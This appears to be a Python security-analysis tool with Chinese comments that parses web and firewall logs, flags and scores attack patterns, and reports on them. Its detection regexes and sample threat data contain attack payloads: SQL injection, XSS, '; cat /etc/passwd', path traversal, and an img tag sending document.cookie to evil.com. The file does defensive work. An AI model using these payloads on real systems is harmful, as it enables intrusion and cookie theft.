#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
网络安全威胁数据深度分析工具
支持批量处理、统计分析、模式识别等高级功能
"""

import json
import pandas as pd
import numpy as np
import requests
import time
import logging
from datetime import datetime, timedelta
from typing import List, Dict, Any, Tuple, Optional
from collections import Counter, defaultdict
import re
import os
import sys

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('data_analysis.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class ThreatDataAnalyzer:
    """威胁数据分析器"""

    def __init__(self, api_base_url="http://localhost:8000"):
        self.api_base_url = api_base_url
        self.api_prefix = "/api/v1"
        self.results = []
        self.stats = defaultdict(int)

    def load_data_from_file(self, file_path: str) -> List[Dict]:
        """从文件加载数据"""
        logger.info(f"正在加载数据文件: {file_path}")

        if not os.path.exists(file_path):
            logger.error(f"文件不存在: {file_path}")
            return []

        try:
            # 根据文件扩展名选择加载方式
            if file_path.endswith('.json'):
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
            elif file_path.endswith('.csv'):
                df = pd.read_csv(file_path)
                data = df.to_dict('records')
            elif file_path.endswith('.txt'):
                # 处理日志文件
                data = self._parse_log_file(file_path)
            else:
                logger.error(f"不支持的文件格式: {file_path}")
                return []

            logger.info(f"成功加载 {len(data)} 条记录")
            return data

        except Exception as e:
            logger.error(f"加载文件失败: {e}")
            return []

    def _parse_log_file(self, file_path: str) -> List[Dict]:
        """解析日志文件"""
        logs = []

        # 常见的日志格式模式
        patterns = {
            'apache': r'(?P<ip>\S+) \S+ \S+ \[(?P<timestamp>.*?)\] "(?P<method>\S+) (?P<url>\S+) (?P<protocol>\S+)" (?P<status>\d+) (?P<size>\S+)',
            'nginx': r'(?P<ip>\S+) - - \[(?P<timestamp>.*?)\] "(?P<method>\S+) (?P<url>\S+) (?P<protocol>\S+)" (?P<status>\d+) (?P<size>\d+)',
            'firewall': r'(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) (?P<action>ACCEPT|DROP|REJECT) (?P<protocol>\S+) (?P<src_ip>\S+) (?P<dst_ip>\S+) (?P<dst_port>\d+)',
            'sql_injection': r'(?P<timestamp>.*?).*?(?:SELECT|INSERT|UPDATE|DELETE).*?(?:FROM|INTO).*?(?:\'|\").*?(?:\'|\")',
            'xss': r'(?P<timestamp>.*?).*?(?:<script|javascript:|on\w+\s*=).*?(?:alert|document\.|window\.)'
        }

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line:
                    continue

                # 尝试匹配各种模式
                for pattern_name, pattern in patterns.items():
                    match = re.search(pattern, line, re.IGNORECASE)
                    if match:
                        log_entry = {
                            'line_number': line_num,
                            'raw_log': line,
                            'pattern_type': pattern_name,
                            'timestamp': match.group('timestamp') if 'timestamp' in match.groupdict() else None,
                            **match.groupdict()
                        }

                        # 提取攻击特征
                        if pattern_name == 'apache' or pattern_name == 'nginx':
                            # Web访问日志
                            if self._is_suspicious_url(match.group('url')):
                                log_entry.update({
                                    'attack_type': self._detect_attack_type(match.group('url')),
                                    'payload': match.group('url'),
                                    'source_ip': match.group('ip'),
                                    'protocol': 'HTTP',
                                    'target_url': match.group('url')
                                })
                        elif pattern_name == 'firewall':
                            # 防火墙日志
                            log_entry.update({
                                'attack_type': 'Network Attack',
                                'action': match.group('action'),
                                'protocol': match.group('protocol'),
                                'source_ip': match.group('src_ip'),
                                'target_ip': match.group('dst_ip'),
                                'target_port': match.group('dst_port')
                            })
                        else:
                            # 直接攻击模式
                            log_entry.update({
                                'attack_type': pattern_name.replace('_', ' ').title(),
                                'payload': line,
                                'raw_log': line
                            })

                        logs.append(log_entry)
                        break

        logger.info(f"从日志文件解析出 {len(logs)} 条可疑记录")
        return logs

    def _is_suspicious_url(self, url: str) -> bool:
        """判断URL是否可疑"""
        suspicious_patterns = [
            r'\.(asp|php|jsp)\?.*\=.*(?:\'|")',
            r'union\s+select',
            r'select\s+.*\s+from',
            r'drop\s+table',
            r'insert\s+into',
            r'update\s+.*\s+set',
            r'delete\s+from',
            r'exec\s*\(',
            r'system\s*\(',
            r'<script',
            r'javascript:',
            r'on\w+\s*=',
            r'\.\./',
            r'%2e%2e',
            r'etc/passwd',
            r'win\.ini',
            r'cmd\.exe'
        ]

        for pattern in suspicious_patterns:
            if re.search(pattern, url, re.IGNORECASE):
                return True
        return False

    def _detect_attack_type(self, payload: str) -> str:
        """检测攻击类型"""
        payload_lower = payload.lower()

        if any(keyword in payload_lower for keyword in ['select', 'union', 'drop', 'insert', 'delete', 'update']):
            return 'SQL Injection'
        elif any(keyword in payload_lower for keyword in ['<script', 'javascript:', 'onload=', 'onerror=']):
            return 'XSS'
        elif any(keyword in payload_lower for keyword in ['../../', '../', '%2e%2e', 'etc/passwd']):
            return 'Directory Traversal'
        elif any(keyword in payload_lower for keyword in [';cat', '|cat', '&&', '||', '`']):
            return 'Command Injection'
        elif any(keyword in payload_lower for keyword in ['<iframe', '<object', '<embed']):
            return 'Code Injection'
        else:
            return 'Suspicious Activity'

    def analyze_batch(self, data: List[Dict], batch_size: int = 50) -> List[Dict]:
        """批量分析数据"""
        logger.info(f"开始批量分析 {len(data)} 条数据，批次大小: {batch_size}")

        all_results = []
        total_batches = (len(data) + batch_size - 1) // batch_size

        for i in range(0, len(data), batch_size):
            batch = data[i:i + batch_size]
            batch_num = i // batch_size + 1

            logger.info(f"处理第 {batch_num}/{total_batches} 批，包含 {len(batch)} 条记录")

            # 调用API分析
            try:
                url = f"{self.api_base_url}{self.api_prefix}/analyze/batch"
                payload = {
                    "alert_list": batch,
                    "enable_rag_enhancement": False,  # 批量处理时关闭RAG以提高速度
                    "max_workers": min(10, len(batch))
                }

                response = requests.post(url, json=payload, timeout=60)

                if response.status_code == 200:
                    batch_results = response.json()
                    all_results.extend(batch_results)
                    logger.info(f"批次 {batch_num} 分析成功")
                else:
                    logger.error(f"批次 {batch_num} 分析失败: {response.status_code}")

                    # 对失败的批次使用简化分析
                    for item in batch:
                        simplified_result = self._simple_analysis(item)
                        all_results.append(simplified_result)

            except Exception as e:
                logger.error(f"批次 {batch_num} 处理异常: {e}")
                continue

            # 避免过载
            time.sleep(0.1)

        logger.info(f"批量分析完成，共处理 {len(all_results)} 条结果")
        return all_results

    def _simple_analysis(self, data: Dict) -> Dict:
        """简单规则分析（API失败时的备用方案）"""
        return {
            "success": True,
            "result": {
                "alert_id": f"simple-{hash(str(data)) % 1000000}",
                "timestamp": datetime.now().isoformat(),
                "routing_analysis": {
                    "selected_route": "rule_based",
                    "target_agent": "analyzer",
                    "confidence": 0.7
                },
                "expert_analysis": {
                    "attack_type": data.get('attack_type', 'Unknown'),
                    "risk_score": self._calculate_risk_score(data),
                    "analysis_details": {
                        "attack_technique": data.get('attack_type', 'Unknown'),
                        "threat_assessment": "Medium threat",
                        "defense_suggestions": self._generate_defense_suggestions(data)
                    }
                },
                "overall_assessment": {
                    "risk_score": self._calculate_risk_score(data),
                    "threat_level": "Medium",
                    "recommended_actions": ["Monitor", "Log", "Review"]
                }
            },
            "processing_time": 0.01
        }

    def _calculate_risk_score(self, data: Dict) -> float:
        """计算风险评分"""
        score = 5.0  # 基础分

        # 根据攻击类型调整
        attack_type = data.get('attack_type', '').lower()
        if 'sql' in attack_type:
            score += 3.5
        elif 'xss' in attack_type:
            score += 3.0
        elif 'command' in attack_type:
            score += 4.0
        elif 'directory' in attack_type:
            score += 2.5

        # 根据载荷复杂度调整
        payload = data.get('payload', '')
        if len(payload) > 100:
            score += 1.0
        if 'union' in payload.lower() and 'select' in payload.lower():
            score += 0.5
        if 'drop' in payload.lower() or 'delete' in payload.lower():
            score += 1.0

        return min(10.0, max(1.0, score))

    def _generate_defense_suggestions(self, data: Dict) -> List[str]:
        """生成防御建议"""
        suggestions = []
        attack_type = data.get('attack_type', '').lower()

        if 'sql' in attack_type:
            suggestions = [
                "Use parameterized queries",
                "Implement input validation",
                "Deploy Web Application Firewall (WAF)",
                "Apply least privilege database access"
            ]
        elif 'xss' in attack_type:
            suggestions = [
                "Implement output encoding",
                "Use Content Security Policy (CSP)",
                "Validate and sanitize input",
                "Use security headers (X-XSS-Protection)"
            ]
        elif 'command' in attack_type:
            suggestions = [
                "Block special characters",
                "Use allow-list for commands",
                "Implement command validation",
                "Run applications with minimal privileges"
            ]
        else:
            suggestions = [
                "Enable comprehensive logging",
                "Deploy intrusion detection system",
                "Regular security monitoring",
                "Implement rate limiting"
            ]

        return suggestions[:3]

    def analyze_statistics(self, results: List[Dict]) -> Dict:
        """统计分析结果"""
        logger.info("开始统计分析...")

        stats = {
            "total_analyzed": len(results),
            "successful": sum(1 for r in results if r.get('success')),
            "failed": sum(1 for r in results if not r.get('success')),
            "average_processing_time": np.mean([r.get('processing_time', 0) for r in results]),
            "attack_types": defaultdict(int),
            "risk_scores": [],
            "top_source_ips": defaultdict(int),
            "time_distribution": defaultdict(int),
            "defense_suggestions": []
        }

        # 统计攻击类型
        for result in results:
            if result.get('success') and 'result' in result:
                expert = result['result'].get('expert_analysis', {})
                attack_type = expert.get('attack_type', 'Unknown')
                stats['attack_types'][attack_type] += 1

                # 收集风险评分
                risk_score = expert.get('risk_score', 5.0)
                stats['risk_scores'].append(risk_score)

                # 收集源IP
                alert_data = expert.get('analysis_details', {})
                if isinstance(alert_data, dict) and 'source_ip' in alert_data:
                    stats['top_source_ips'][alert_data['source_ip']] += 1

        # 计算平均风险评分
        if stats['risk_scores']:
            stats['average_risk_score'] = np.mean(stats['risk_scores'])
            stats['high_risk_count'] = sum(1 for s in stats['risk_scores'] if s >= 7.0)
            stats['medium_risk_count'] = sum(1 for s in stats['risk_scores'] if 4.0 <= s < 7.0)
            stats['low_risk_count'] = sum(1 for s in stats['risk_scores'] if s < 4.0)

        # 最常见的攻击类型
        stats['top_attack_types'] = sorted(
            stats['attack_types'].items(),
            key=lambda x: x[1],
            reverse=True
        )[:5]

        # 最活跃的源IP
        stats['top_source_ips'] = sorted(
            stats['top_source_ips'].items(),
            key=lambda x: x[1],
            reverse=True
        )[:10]

        logger.info("统计分析完成")
        return dict(stats)

    def generate_report(self, data: List[Dict], results: List[Dict], stats: Dict) -> str:
        """生成分析报告"""
        report = []
        report.append("=" * 80)
        report.append("网络安全威胁分析报告")
        report.append("=" * 80)
        report.append(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"分析数据量: {len(data)} 条")
        report.append(f"成功分析: {stats['successful']} 条")
        report.append(f"失败分析: {stats['failed']} 条")
        report.append(f"成功率: {stats['successful']/len(results)*100:.2f}%")
        report.append("")

        # 攻击类型分布
        report.append("1. 攻击类型分布")
        report.append("-" * 40)
        for attack_type, count in stats['top_attack_types']:
            percentage = count / len(results) * 100
            report.append(f"   {attack_type}: {count} ({percentage:.1f}%)")
        report.append("")

        # 风险分布
        if 'average_risk_score' in stats:
            report.append("2. 风险评分分布")
            report.append("-" * 40)
            report.append(f"   平均风险评分: {stats['average_risk_score']:.2f}")
            report.append(f"   高风险(>=7.0): {stats['high_risk_count']} 条")
            report.append(f"   中风险(4.0-7.0): {stats['medium_risk_count']} 条")
            report.append(f"   低风险(<4.0): {stats['low_risk_count']} 条")
            report.append("")

        # 热门源IP
        if stats['top_source_ips']:
            report.append("3. 最活跃的源IP地址")
            report.append("-" * 40)
            for ip, count in stats['top_source_ips'][:5]:
                report.append(f"   {ip}: {count} 次攻击")
            report.append("")

        # 性能指标
        report.append("4. 处理性能")
        report.append("-" * 40)
        report.append(f"   平均处理时间: {stats['average_processing_time']:.3f} 秒")
        report.append(f"   总处理时间: {sum(r.get('processing_time', 0) for r in results):.3f} 秒")
        report.append("")

        # 高风险威胁详情
        report.append("5. 高风险威胁详情")
        report.append("-" * 40)
        high_risk_count = 0
        for i, result in enumerate(results[:10]):  # 显示前10条
            if result.get('success') and 'result' in result:
                expert = result['result'].get('expert_analysis', {})
                risk_score = expert.get('risk_score', 0)
                if risk_score >= 7.0:
                    high_risk_count += 1
                    if high_risk_count <= 5:  # 只显示前5条高风险
                        report.append(f"   威胁 #{i+1}:")
                        report.append(f"     类型: {expert.get('attack_type', 'N/A')}")
                        report.append(f"     风险评分: {risk_score:.1f}")
                        if 'analysis_details' in expert and isinstance(expert['analysis_details'], dict):
                            tech = expert['analysis_details'].get('attack_technique', 'N/A')
                            report.append(f"     技术: {tech}")
                        report.append("")

        # 建议措施
        report.append("6. 建议措施")
        report.append("-" * 40)
        report.append("   1. 加强Web应用防火墙规则")
        report.append("   2. 实施输入验证和输出编码")
        report.append("   3. 定期更新安全补丁")
        report.append("   4. 部署入侵检测系统")
        report.append("   5. 建立安全监控和告警机制")
        report.append("")

        report.append("=" * 80)
        report.append("报告结束")

        return "\n".join(report)

    def export_results(self, results: List[Dict], format: str = 'json', filename: str = None) -> str:
        """导出分析结果"""
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"threat_analysis_results_{timestamp}"

        if format == 'json':
            filepath = f"{filename}.json"
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(results, f, ensure_ascii=False, indent=2)
        elif format == 'csv':
            # 转换为DataFrame并导出
            flat_results = []
            for r in results:
                if r.get('success') and 'result' in r:
                    flat = {
                        'success': r['success'],
                        'processing_time': r['processing_time'],
                        'alert_id': r['result'].get('alert_id', ''),
                        'timestamp': r['result'].get('timestamp', '')
                    }
                    # 展开专家分析
                    expert = r['result'].get('expert_analysis', {})
                    if expert:
                        flat['attack_type'] = expert.get('attack_type', '')
                        flat['risk_score'] = expert.get('risk_score', '')
                    flat_results.append(flat)

            df = pd.DataFrame(flat_results)
            filepath = f"{filename}.csv"
            df.to_csv(filepath, index=False, encoding='utf-8-sig')
        elif format == 'excel':
            # 导出Excel，多个工作表
            filepath = f"{filename}.xlsx"
            with pd.ExcelWriter(filepath, engine='openpyxl') as writer:
                # 主结果
                flat_results = []
                for r in results:
                    if r.get('success') and 'result' in r:
                        flat = {
                            'alert_id': r['result'].get('alert_id', ''),
                            'timestamp': r['result'].get('timestamp', ''),
                            'success': r['success'],
                            'processing_time': r['processing_time']
                        }
                        expert = r['result'].get('expert_analysis', {})
                        if expert:
                            flat['attack_type'] = expert.get('attack_type', '')
                            flat['risk_score'] = expert.get('risk_score', '')
                        flat_results.append(flat)

                df_main = pd.DataFrame(flat_results)
                df_main.to_excel(writer, sheet_name='Main Results', index=False)

                # 统计信息
                stats = self.analyze_statistics(results)
                stats_df = pd.DataFrame(list(stats.items()), columns=['Metric', 'Value'])
                stats_df.to_excel(writer, sheet_name='Statistics', index=False)

        logger.info(f"结果已导出到: {filepath}")
        return filepath

def main():
    """主程序"""
    print("=" * 80)
    print("网络安全威胁数据深度分析工具")
    print("=" * 80)

    analyzer = ThreatDataAnalyzer()

    # 获取数据文件
    data_files = []

    # 查找data目录下的文件
    if os.path.exists('data'):
        for file in os.listdir('data'):
            if file.endswith(('.json', '.csv', '.txt', '.log')):
                data_files.append(os.path.join('data', file))

    # 如果没有数据文件，创建示例数据
    if not data_files:
        print("\n没有找到数据文件，将创建示例数据进行演示...")

        # 创建示例威胁数据
        sample_data = [
            {
                "attack_type": "SQL Injection",
                "payload": "SELECT * FROM users WHERE id='1' OR '1'='1",
                "source_ip": "192.168.1.100",
                "target_ip": "10.0.0.5",
                "timestamp": "2025-01-10T12:00:00Z",
                "attack_stage": "execution",
                "threat_level": "high",
                "protocol": "HTTP"
            },
            {
                "attack_type": "XSS",
                "payload": "<script>alert('XSS')</script>",
                "source_ip": "192.168.1.101",
                "target_ip": "10.0.0.6",
                "timestamp": "2025-01-10T12:05:00Z",
                "attack_stage": "injection",
                "threat_level": "medium",
                "protocol": "HTTP"
            },
            {
                "attack_type": "Command Injection",
                "payload": "; cat /etc/passwd",
                "source_ip": "192.168.1.102",
                "target_ip": "10.0.0.7",
                "timestamp": "2025-01-10T12:10:00Z",
                "attack_stage": "execution",
                "threat_level": "critical",
                "protocol": "HTTP"
            },
            {
                "attack_type": "Directory Traversal",
                "payload": "../../../etc/passwd",
                "source_ip": "192.168.1.103",
                "target_ip": "10.0.0.8",
                "timestamp": "2025-01-10T12:15:00Z",
                "attack_stage": "access",
                "threat_level": "medium",
                "protocol": "HTTP"
            },
            {
                "attack_type": "CSRF",
                "payload": "<img src='http://evil.com/steal?cookie=' + document.cookie>",
                "source_ip": "192.168.1.104",
                "target_ip": "10.0.0.9",
                "timestamp": "2025-01-10T12:20:00Z",
                "attack_stage": "injection",
                "threat_level": "low",
                "protocol": "HTTP"
            }
        ]

        # 保存示例数据
        os.makedirs('data', exist_ok=True)
        with open('data/sample_threats.json', 'w', encoding='utf-8') as f:
            json.dump(sample_data, f, ensure_ascii=False, indent=2)

        data_files = ['data/sample_threats.json']
        print(f"已创建示例数据文件: {data_files[0]}")

    # 加载所有数据
    all_data = []
    for file_path in data_files:
        data = analyzer.load_data_from_file(file_path)
        all_data.extend(data)

    if not all_data:
        print("\n错误：没有可用的数据")
        return

    print(f"\n总共加载了 {len(all_data)} 条数据")

    # 分析数据
    print("\n开始深度分析...")
    results = analyzer.analyze_batch(all_data)

    # 统计分析
    print("\n进行统计分析...")
    stats = analyzer.analyze_statistics(results)

    # 生成报告
    report = analyzer.generate_report(all_data, results, stats)
    print("\n" + report)

    # 保存报告
    report_file = f"analysis_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write(report)
    print(f"\n报告已保存到: {report_file}")

    # 导出结果
    print("\n导出分析结果...")
    exported_file = analyzer.export_results(results, format='excel')
    print(f"结果已导出到: {exported_file}")

    print("\n分析完成！")

if __name__ == "__main__":
    # 设置UTF-8编码（Windows）
    if sys.platform == 'win32':
        sys.stdout.reconfigure(encoding='utf-8')

    main()